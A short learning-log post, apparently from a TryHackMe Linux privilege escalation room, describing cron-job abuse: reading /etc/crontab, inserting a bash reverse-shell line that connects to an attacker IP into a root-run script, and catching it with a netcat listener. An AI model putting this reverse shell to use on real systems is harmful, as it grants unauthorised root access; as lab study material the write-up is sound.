🎯 Day 12 Task


➡️ Working on Bug bounty Wordlist tool inspired by [Kathan Patel](https://twitter.com/KathanP19)


🔁 TryHackMe Room


➡️ Working on Linux PrivEsc


✅ Completed Task 9 Privilege Escalation Cronjob


My Steps : 


First find how many cronjobs set ?


**cat /etc/crontab**

then edit the script **nano /../..file.sh** 


**#!/bin/bash
bash -i >& /dev/tcp/IP/PORT 0>1**  ---------------> [ Here IP = TryHackMe VPN IP & Same PORT number which you use in nc ]


then run **nc -lvnp PORT**

wait some minutes & then you got root shell :)


#infosec #learn365 #privesc
